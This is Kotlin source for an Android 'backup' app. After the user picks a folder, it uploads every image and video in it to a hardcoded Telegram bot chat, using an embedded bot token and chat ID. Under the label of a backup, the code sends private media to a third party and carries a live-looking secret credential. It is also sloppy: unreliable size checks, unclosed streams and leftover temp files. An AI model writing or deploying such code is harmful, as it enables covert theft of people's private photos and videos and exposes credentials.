package com.example.backupapp

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.DocumentsContract
import androidx.appcompat.app.AppCompatActivity
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.InputStream
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private val BOT_TOKEN = "8442024575:AAGk9wWYxDwEK55gySvqt1c5jKU6PiFQOxQ"
    private val CHAT_ID = "7349061535"

    private val PICK_FOLDER = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Start folder picker immediately (simple UI)
        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT_TREE)
        startActivityForResult(intent, PICK_FOLDER)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == PICK_FOLDER && resultCode == Activity.RESULT_OK) {
            data?.data?.let { uri ->
                scanAndBackup(uri)
            }
        }
    }

    private fun scanAndBackup(uri: Uri) {
        thread {

            val childrenUri = DocumentsContract.buildChildDocumentsUriUsingTree(
                uri,
                DocumentsContract.getTreeDocumentId(uri)
            )

            val cursor = contentResolver.query(
                childrenUri,
                arrayOf(
                    DocumentsContract.Document.COLUMN_DOCUMENT_ID,
                    DocumentsContract.Document.COLUMN_DISPLAY_NAME,
                    DocumentsContract.Document.COLUMN_MIME_TYPE
                ),
                null, null, null
            )

            cursor?.use {

                while (it.moveToNext()) {

                    val docId = it.getString(0)
                    val name = it.getString(1)
                    val mime = it.getString(2)

                    val fileUri = DocumentsContract.buildDocumentUriUsingTree(uri, docId)

                    val inputStream = contentResolver.openInputStream(fileUri)
                    val size = inputStream?.available() ?: 0

                    if (size > 100 * 1024 * 1024) continue

                    if (mime.startsWith("image") || mime.startsWith("video")) {
                        uploadToTelegram(name, inputStream!!)
                    }
                }
            }
        }
    }

    private fun uploadToTelegram(fileName: String, inputStream: InputStream) {

        val tempFile = File(cacheDir, fileName)

        tempFile.outputStream().use { output ->
            inputStream.copyTo(output)
        }

        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"

        val client = OkHttpClient()

        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart(
                "document",
                tempFile.name,
                tempFile.asRequestBody("application/octet-stream".toMediaTypeOrNull())
            )
            .build()

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).execute()
    }
}